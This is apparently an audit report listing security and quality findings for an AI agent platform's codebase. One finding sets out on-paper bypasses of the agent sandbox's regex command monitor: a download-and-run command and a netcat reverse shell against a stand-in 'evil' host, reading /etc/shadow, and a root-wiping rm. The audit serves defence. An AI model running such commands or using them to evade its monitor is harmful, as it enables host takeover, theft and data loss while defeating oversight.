title: Dependency audits never fail CI (|| true)
evidence: .github/workflows/local-ci.yml:145 'run: uvx pip-audit --no-deps --disable-pip -r /tmp/reqs.txt || true'; :151 'run: cd frontend && pnpm audit || true'
impact: Known CVEs in deps merge silently; the audit job is decorative.
fix: Drop '|| true'; add an allowlist file (pip-audit --ignore-vuln, pnpm audit --audit-level=high) for accepted CVEs.

title: Coverage measured but no floor, and excludes app/ (gateway, auth, routers)
evidence: backend/Makefile:14 'uv run pytest tests/ --cov=packages/harness/deerflow --cov-report=term-missing'; no fail_under anywhere (grep fail_under backend/ .github -> none)
impact: Coverage can drop to zero on auth/guardrail/router code without any signal; app/gateway is not even measured.
fix: Add --cov=app, a .coveragerc with fail_under, and per-module floors for auth/guardrail/classifier.

title: Local CI (make ci/ci-fast) requires act + Docker; cannot be run on the live box safely
evidence: Makefile: 'ci-fast: act push -W .github/workflows/local-ci.yml ...'
impact: Baseline had to be reproduced by running the underlying jobs directly; devs on the prod host skip CI.
fix: Add a 'make ci-local' that runs the same commands natively (no act).

title: make doctor reports config.yaml unloadable on the prod host (DATABASE_URL lives only in compose env)
evidence: audit/raw/00-doctor.txt: '✗ config.yaml loadable (Environment variable DATABASE_URL not found)'; scripts/doctor.py:729-733 loads only .env; docker/docker-compose-dev.yaml:359 '- DATABASE_URL=postgresql://${NOVA_PG_USER:-...}'
impact: Doctor exits 1 on a healthy deployment; operators learn to ignore it.
fix: Have doctor detect compose mode (NOVA_STACK / docker ps deer-flow-gateway) and skip or source the compose env.

title: gitleaks: no real secrets in tracked files or git history (24 history hits are all test fixtures / doc examples); no .gitleaks.toml allowlist and gitleaks is not in CI
evidence: audit/raw/00-gitleaks-history.json (24 hits, e.g. backend/tests/test_support_bundle.py:48 'access_token=' redaction fixture, backend/docs/AUTH_UPGRADE.md:34 'Password:' first-boot example); no .gitleaks.toml (ls -> none); no gitleaks in .github/workflows/*
impact: Without a CI gate the next real leak lands silently; without an allowlist the scan is too noisy to be adopted.
fix: Add .gitleaks.toml allowlisting backend/tests/** fixture patterns and a gitleaks job in local-ci.yml.

title: Live secrets duplicated into two stray .kilo/worktrees/*/.env copies on the prod host
evidence: .kilo/worktrees/fringe-whitefish/.env:16,70,141,167,177 and .kilo/worktrees/olivine-petalite/.env (gitleaks generic-api-key, redacted); .kilo is gitignored
impact: Each copy is another place a key can leak from (backups, support bundles, agent sandboxes that mount the repo root); rotation must remember 3 files.
fix: Delete the stale worktrees (git worktree prune) or have them symlink ../.env; add .kilo/ to the sandbox mount denylist.

title: Next.js 16.2.12 carries 2 CRITICAL advisories (patched >=16.3.3); 37 high / 39 moderate total in pnpm audit
evidence: frontend/package.json:74 '"next": "^16.2.12"'; frontend/pnpm-lock.yaml 'next@16.2.12'; audit/raw/00-pnpm-audit.json metadata {'critical': 2, 'high': 37, 'moderate': 39, 'low': 9}
impact: CVE-2026-75604 is Windows-only (N/A on this Linux host); the AVIF/sharp RCE in the Image Optimization API is reachable if /_next/image is exposed through nginx (no <Image> usage in src, but the route exists). High-severity dompurify/mermaid XSS bypasses matter because agent output is rendered as markdown.
fix: pnpm up next@^16.3.3 dompurify mermaid js-yaml minimatch flatted; re-run pnpm audit; make CI-001 fail on high+.
blast_radius: Frontend build; regression risk covered by vitest+playwright

title: pip-audit: langgraph-checkpoint-sqlite 3.0.3 has PYSEC-2026-3636 (fix 3.1.1); 1 of 193 locked prod packages vulnerable
evidence: backend/packages/harness/pyproject.toml: 'langgraph-checkpoint-sqlite>=3.0.3'; audit/raw/00-pip-audit.json; config.yaml:373-375 'checkpointer: type: postgres' (sqlite checkpointer is the rollback path, not live)
impact: Low live exposure (postgres checkpointer active) but the sqlite path is the documented rollback.
fix: uv lock --upgrade-package langgraph-checkpoint-sqlite

title: README red-team tables (Metasploit, Ghidra, Sliver, Empire, bloodhound, NetExec, responder, Mimikatz, Volatility, radare2, ZAP, OpenVAS, Wazuh, Falco, Snort) are NOT installed in the sandbox image nor mounted as executables; /mnt/security-toolkit is documentation only
evidence: README.md:150-175 red-team/blue-team tables; docker/sandbox/Dockerfile.tools:314-318 apt list (nmap sqlmap nikto nuclei gitleaks etc. real) but 'grep -icE metasploit|ghidra|sliver|... Dockerfile.tools' = 0; aio_sandbox_provider.py:386 mounts DEER_FLOW_SECURITY_TOOLKIT ro -> resolves to /home/jahanzaib/Security-Toolkit/docs (markdown KB, 'find -executable' = none)
impact: The 'build then break' loop only has the ~30 apt/pip tools actually in the image; the marquee C2/RE/AD tooling would error 'command not found' in a sandbox. The '80+ tools' badge counts KB doc entries, not runnable tools.
fix: Split the README table into 'installed in image' vs 'documented in KB'; or actually install the claimed tools.

title: SandboxAudit '100% recall / 0% false positive' is measured only against a 28-item hand-curated corpus in the same test file (circular)
evidence: README.md:143 '100% high-risk recall, 0% false positive rate'; backend/tests/test_sandbox_audit_middleware.py:704-715 asserts high_recall==1.0 & false_positive_rate==0.0 over TestBenchmarkSummary.HIGH_RISK/SAFE (28/22 items curated to match the classifier)
impact: The number is real but not generalizable; readers infer a validated real-world detection rate. Bypass classes not in the corpus (unicode, newline-injection, delayed exec) are untested — see Phase 5.
fix: Reword to 'passes a curated regression corpus'; grow the corpus from real bypass attempts and add adversarial cases.

title: Test-count claims are internally inconsistent across docs (README 152+53 files / 38,782 lines; NOVA_VS_DEERFLOW 418 files; docs/AUDIT 6,928 / 6,430 tests) vs measured 401 test_*.py files, 6,900 backend + 689 frontend tests
evidence: README.md:104 '152 backend + 53 frontend test files'; NOVA_VS_DEERFLOW.md:23 '266->418'; docs/AUDIT.md:21 '6430 tests', :786 '6,928'; measured (Phase 0): 401 test_*.py, 6900 passed / 689 frontend
impact: Numbers drift because nothing tests them; erodes trust in every other quantitative claim.
fix: Add a docs-claim test (CI) asserting counts from a generated manifest; cite one source of truth. See gate GATE-DOCS.

title: test_no_cross_references.py is a sibling-project name gate (ali-kernel/ornith), not architectural isolation as docs imply
evidence: backend/tests/test_no_cross_references.py:1-5 'nova MUST NOT reference ali-kernel or ornith'; allows deerflow self-refs
impact: Readers assume module-boundary enforcement that does not exist.
fix: Rename/redocument the gate; if module isolation is wanted, add a real import-layering test.

title: Naive datetime.now() used for subagent lifecycle timestamps (started_at/completed_at) that may be compared/serialized against aware datetimes
evidence: backend/packages/harness/deerflow/subagents/executor.py:133,509,826 'datetime.now()'; contrast persistence which likely stores tz-aware
impact: Mixed naive/aware comparison raises TypeError, or durations skew across DST; 9 naive-datetime sites in prod.
fix: Use datetime.now(timezone.utc); add a lint rule banning bare now()/utcnow().

title: 90 silent 'except ...: pass' blocks in production code mask failures
evidence: grep 'except...:\n pass' across harness/deerflow+app = 90; e.g. best-effort cleanup paths
impact: Real errors (cleanup failures, cache corruption) vanish with no log; hard to debug incidents.
fix: Convert to 'except X: logger.debug(...)'; ban bare-pass via ruff (BLE001/S110).

title: tsconfig has strict:true but noImplicitAny:false, weakening the strict guarantee at untyped boundaries
evidence: frontend/tsconfig.json:13-15 'strict: true','noUncheckedIndexedAccess: true','noImplicitAny: false'
impact: Implicit any silently disables type-checking on unannotated params/returns (esp. API responses); strictness is partly cosmetic.
fix: Flip noImplicitAny to true and fix fallout; only 1 explicit 'any' today so surface is small.

title: SandboxAudit command classifier is a regex denylist with many trivial bypasses; combined with privileged sandbox this is the thin barrier before host root
evidence: sandbox_audit_middleware.py:25-60 _HIGH_RISK_PATTERNS. Bypasses (paper, not executed): 'head /etc/shadow' (only 'cat\s+/etc/shadow' matched); 'rm -rf /etc' and 'rm -rf / --no-preserve-root' (alternation is /|~|/home|/root with trailing $); two-step 'curl http://evil/x.sh -o /tmp/x && bash /tmp/x' (split on &&, 'bash /tmp/x' matches nothing); 'nc -e /bin/sh evil 4444'; 'python3 -c' reverse shell without /dev/tcp; 'base64 -d p > /tmp/x; sh /tmp/x' (no pipe)
impact: Denylist gives a false sense of coverage; the 100% recall claim (CLAIM-002) hides these classes. Any bypass runs unrestricted in the sandbox.
fix: Treat classifier as advisory telemetry, not a control; add the bypass corpus as regression tests; rely on container isolation (SEC-011) as the real boundary and shrink it.

title: Live sandbox runs the android/dind image with privileged: true (host-root-equivalent); subagents share it, so one classifier bypass = host compromise
evidence: config.yaml:239 'image: nova-sandbox-android:latest'; config.yaml:272 'privileged: true' with inline comment 'Effectively host root'; config.example.yaml:1005 ships 'privileged: false' by default and warns against it; subagents share parent sandbox (config.yaml:290 comment)
impact: A --privileged container can mount host devices, load kernel modules, and escape to root on the host that also runs Postgres, all tunnels, and ~30 other PM2 apps. The only thing between agent-generated bash and host root is the bypassable regex (SEC-010).
fix: Run the default workload on the tools (non-dind) layer with privileged:false; gate dind behind an explicit per-thread opt-in + allowlist; if dind is required, isolate it on a separate host/VM, not the box hosting prod.

title: Running sandbox image is the floating :latest tag, not digest-pinned (contradicts README 'pinned by digest')
evidence: config.yaml:239 'image: nova-sandbox-android:latest'; README.md:100,260 'Pinned by digest'. Only Dockerfile.base FROM is digest-pinned (Dockerfile.base:17)
impact: A rebuilt/re-pushed :latest silently changes the runtime; supply-chain drift, non-reproducible sandboxes.
fix: Pin config.yaml image to a sha256 digest; enforce in a startup check.

title: IM channels default to allow-all: empty allowed_users means any user who finds the bot can drive the agent (privileged sandbox + API spend)
evidence: All 6 channels gate on allowed_users being non-empty: dingtalk.py:391 'if self._allowed_users and X not in', slack.py:318 same; telegram.py:384/feishu.py:89/wecom.py:351/wechat.py:815 'if not self._allowed_users' (allow); config.example.yaml:1510 'empty = allow all'
impact: An unauthenticated third party can run agent tasks that cost model tokens and execute in a --privileged sandbox (compounds SEC-011). No per-user budget either (PROD).
fix: Default to deny (empty allowlist = allow none) or require an explicit allow_all: true opt-in; add per-user rate/budget caps.

title: Execution/security audit trail is in-memory only (deque maxlen=10000), lost on restart and silently evicted; README implies an append-only audit table
evidence: execution/audit.py:32-33 'deque(maxlen=max_records)' max 10000, threading.Lock, hash-chained; not persisted. (Admin actions ARE persisted via persistence/admin_audit AdminAuditRow, and run_events go to DB — so it is split.)
impact: The tamper-evident hash chain is broken by ring-buffer eviction and gone after a restart; forensic/security audit of bash executions is not durable.
fix: Persist the execution audit chain to the DB (append-only table, verify chain on read); keep the in-memory deque as a cache.

title: JWT decode does not verify audience/issuer and does not require exp; alg pinned to HS256 (good)
evidence: backend/app/gateway/auth/jwt.py:48 jwt.decode(token, secret, algorithms=['HS256']) with no options/audience/issuer
impact: A token minted without exp never expires; no aud/iss binding across services. alg confusion is prevented (HS256 pinned).
fix: Pass options={'require':['exp']} and verify aud/iss if multi-service.

title: No frontend↔backend contract/OpenAPI sync test; frontend API types are hand-written and can drift from Gateway routers
evidence: frontend/src/core/api/api-client.ts + agents/api.ts are hand-authored (no codegen header); backend has some contract tests (test_custom_events_contract.py, test_auth_type_system.py) but nothing asserts FE types match BE schemas
impact: A router response-shape change compiles clean on both sides and breaks at runtime; caught only by e2e if at all.
fix: Generate FE types from Gateway OpenAPI (openapi-typescript) and add a CI drift check.

title: Schema is created via Base.metadata.create_all at boot; Alembic migrations exist but nothing runs them on deploy — column/type changes to existing tables never apply in prod
evidence: persistence/engine.py:195,205 'await conn.run_sync(Base.metadata.create_all)'; app.py:101 'freshly created tables ... via create_all'; 10+ migration files in persistence/migrations/versions/ but no 'alembic upgrade' in scripts/*.sh, docker/*.yaml, or pm2-deerflow.sh
impact: create_all only creates MISSING tables; it never ALTERs. A migration that adds/changes a column on an existing table is silently not applied → runtime column-missing errors or drift between the ORM and the live schema.
fix: Run 'alembic upgrade head' on deploy (pm2-deerflow.sh / compose entrypoint); add a CI test that the models match a fresh 'alembic upgrade head' (autogenerate --check).

title: No per-user LLM token/cost budget; combined with allow-all IM channels (SEC-013) and no general API rate limit, a runaway or hostile user can burn unbounded model spend
evidence: grep budget/quota/spend across harness+app: only crawl page-budgets and sandbox CPU/warm-pool budgets; no LLM cost cap. Rate limiter scoped to auth endpoints only (app.py:419 AuthRateLimitMiddleware). credit_grants/credit_requests tables exist but are not enforced as a hard runtime ceiling on model calls (verify).
impact: Unbounded cost exposure; a single fan-out of subagents or an open-bot abuser multiplies spend.
fix: Add a per-user/per-thread token budget enforced in the run loop; wire the existing credit tables to a hard stop; add general API rate limiting.

title: Live stream_bridge.type=memory: SSE bridge, rate limiter, cancel-signal and distributed-lock all fall back to in-process; horizontal scale is impossible despite Redis being available
evidence: config.yaml:408 'stream_bridge: type: memory'; app.py:414-418 rate limiter needs type==redis AND redis_url else InMemoryRateLimiter; redis_provider.py/distributed_lock.py/cancel_signal.py exist but unused
impact: A second Gateway replica would split SSE state, rate-limit counters and run-cancellation — cross-replica bugs the code comments already warn about. Also single point of failure.
fix: Switch stream_bridge to redis (reuse the sandbox-image Redis) to unlock multi-replica; keep memory for single-host dev.

title: No LLM response caching (LiteLLM cache unconfigured) and no ETag on read-heavy GETs (models/skills lists)
evidence: docker/litellm/config.yaml:55 litellm_settings has no cache block; routers/models.py & skills.py return lists with no ETag/If-None-Match (only artifacts.py:163 sets Cache-Control)
impact: Repeated identical skill/tool/model list fetches and repeated LLM calls re-do full work; higher latency + cost.
fix: Enable LiteLLM Redis semantic/exact cache for idempotent calls; add ETag to GET /api/models and /api/skills.

title: No migration gate: nothing checks that Alembic head matches the ORM models, and create_all masks drift (PROD-001)
evidence: persistence/engine.py:195 create_all; versions/ has migrations; no 'alembic check'/autogenerate --check in CI
impact: Schema drift ships silently.
fix: CI job: spin postgres, alembic upgrade head, alembic check (autogenerate diff must be empty).

title: No docs-claim test: README/AUDIT/VS_DEERFLOW counts drift freely (CLAIM-003)
evidence: 3 docs disagree on test counts (README:104 152+53 files; NOVA_VS_DEERFLOW.md:23 418; docs/AUDIT.md:21 6430, :786 6928); none matches measured 401 test_*.py / 6900+689
impact: Every quantitative claim loses credibility; onboarding is misled.
fix: CI test that reads BUILTIN_TOOLS len, skills/public count, probe count, pytest collection count and asserts (or generates) the README numbers.

title: CI lacks gitleaks, image scan (Trivy/Grype), SBOM, and mutation testing despite README listing them as the scanning arsenal
evidence: README.md:180-190 lists Trivy/Grype/Gitleaks/TruffleHog/Semgrep; .github/workflows has codeql only; local-ci pip-audit/pnpm audit are '|| true' (CI-001)
impact: The advertised security-scanning layer is not actually enforced in CI; leaks/vulnerable images can merge.
fix: Add gitleaks + Trivy(fs+image, fail HIGH/CRITICAL w/ allowlist) + syft SBOM jobs; nightly mutmut on classifier/auth.
